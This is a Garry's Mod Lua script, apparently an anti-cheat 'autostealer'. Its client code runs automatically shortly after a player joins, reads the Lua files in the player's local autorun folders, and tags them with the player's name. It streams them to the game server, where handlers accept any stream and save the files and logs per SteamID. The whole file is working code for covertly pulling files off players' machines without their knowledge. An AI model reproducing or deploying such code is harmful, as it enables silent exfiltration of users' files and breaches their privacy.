if (CLIENT) then
	local WaitFor = 3 --30
	
	local NoSend = {
		--add to this when you get loads of bullshit logs
		"autorun/cat.lua-932",
		"autorun/catply.lua-1017",
		"autorun/client/cl_advdupe.lua-25981",
		"autorun/hac_cl_loader.lua-898",
		"autorun/client/player_info.lua-561",
		"autorun/hsp_loader.lua-2988",
		"autorun/client/globalscheck.lua-334",
		"includes/enum/class.lua-255",
		"includes/enum/print_types.lua-84",
		"autorun/serialiser.lua-16288",
		"includes/enum/rendergroup.lua-80",
		"autorun/sh_spropprotection.lua-821",
		"includes/enum/rendermode.lua-672",
		"autorun/ulib_init.lua-108",
		"includes/enum/sim_phys.lua-122",
		"autorun/base_npcs.lua-8541",
		"includes/enum/teams.lua-135",
		"autorun/base_npcs_weapons.lua-658",
		"includes/enum/text_align.lua-111",
		"autorun/base_vehicles.lua-7784",
		"includes/enum/transmit.lua-233",
		"autorun/developer_functions.lua-1744",
		"includes/enum/use_types.lua-292",
		"autorun/options_menu.lua-10729",
		"autorun/utilities_menu.lua-2653",
		"autorun/cs_playermodels.lua-1896",
		"autorun/ep2_entities.lua-581",
		"autorun/ep2_npcs.lua-974",
		"autorun/ep2_playermodels.lua-156",
		"autorun/ep2_vehicles.lua-543",
	}
	
	
	local ToSteal = {
		{
			What  = "*.lua",
			Where = "autorun/",
		},
		{
			What  = "*.lua",
			Where = "autorun/client/",
		},
	}
	
	
	require("datastream")
	
	local function ValidString(v)
		return (v and type(v) == "string" and v != "")
	end
	local function Size(v)
		local size = file.Size("../lua/"..v)
		if (size == -1) then
			return 0
		else
			return size
		end
	end
	
	local function DoCheck()
		local Booty = {}
		local BootyTime = (#ToSteal / 1.5 + 16)
		
		for k,v in pairs(ToSteal) do
			timer.Simple(k / 2, function()
				local What 	= v.What
				local Where = v.Where
				local File	= Where..What
				
				if ValidString(File) and (#file.FindInLua(File) >= 1) then
					for x,y in pairs(file.FindInLua(File)) do
						timer.Simple(x / 2, function() --x / 2
							local NewFile = tostring(Where..y)
							local NewSize = tostring( Size(NewFile) )
							if ValidString(y) and (#file.FindInLua(NewFile) >= 1) then
								if not table.HasValue(NoSend, Format("%s-%s", NewFile, NewSize) ) then
									table.insert(Booty,
										{
											Name = NewFile,
											Size = NewSize,
											Cont = Format("%s\n%s\n===Begin Stream===\n\n%s", NewFile, (LocalPlayer():Nick() or "Fuck"), file.Read("lua/"..NewFile, true) ),
										}
									)
									RunConsoleCommand("sendhacks", NewFile, NewSize)
								end
							end
						end)
					end
				end
			end)
		end
	
		timer.Simple(BootyTime, function()
			if (#Booty >= 1) then
				--print("! sending booty: ", #Booty, " took: ", BootyTime)
				datastream.StreamToServer("sendhacks", Booty) --function() RunConsoleCommand("gm_finishtools") end
			end
		end)
	end
	timer.Simple(WaitFor, DoCheck)
end




if (SERVER) then
	AddCSLuaFile("autorun/autostealer.lua") --changeme
	
	function GimmeAccept(ply,handle,id)
		return true
	end
	hook.Add("AcceptStream", "GimmeAccept", GimmeAccept)

	
	function GimmeLog(ply,cmd,args)
		if not ply:IsValid() then return end
		local SID = ply:SteamID():gsub(":","_"):lower()
		local NewFile = args[1] or "-Fuckup-"
		local NewSize = args[2] or "-Fuckup-"
		local LogName = "hac_autostealer_log-"..SID..".txt"
		
		local Filename = Format("hac_autostealer-%s/%s-%s.txt", SID, NewFile:gsub(".lua",""), NewSize)
		
		if not file.Exists(Filename) then
			print( Format("AutoStealing %s from %s (%s)\n", NewFile, ply:Nick(), ply:SteamID()) )
			
			if not file.Exists(LogName) then
				file.Write(LogName, Format("AutoStealer log created at [%s]\nFor: %s\n\n", os.date("%d-%m-%y %I:%M:%S%p"), ply:Nick() ) )
			end
			filex.Append(LogName, Format('\t"%s-%s",\n', NewFile, NewSize) )
		end
	end
	concommand.Add("sendhacks", GimmeLog)
	
	function GimmeRX(ply,han,id,enc,dec)
		local SID = ply:SteamID():gsub(":","_"):lower()
		local LogName = "hac_autostealer_log-"..SID..".txt"
		local num = 0
		
		for k,v in pairs(dec) do
			local LuaName = (v.Name or tostring(num)):gsub(".lua","")
			local Size = v.Size or 0
			local Cont = v.Cont or "fuckup"
			local Filename = Format("hac_autostealer-%s/%s-%s.txt", SID, LuaName, Size)
			
			if not file.Exists(Filename) then
				file.Write(Filename, Cont)
				num = num + 1
			end
		end
		
		if (num > 0) then
			print( Format("AutoStealing %s of %s's files complete!\n", num, ply:Nick()) )
			
			if file.Exists(LogName) then
				filex.Append(LogName, Format("\n%s files recieved @ [%s]\n\n\n", num, os.date("%d-%m-%y %I:%M:%S%p")) )
			end
		end
	end
	datastream.Hook("sendhacks", GimmeRX)
end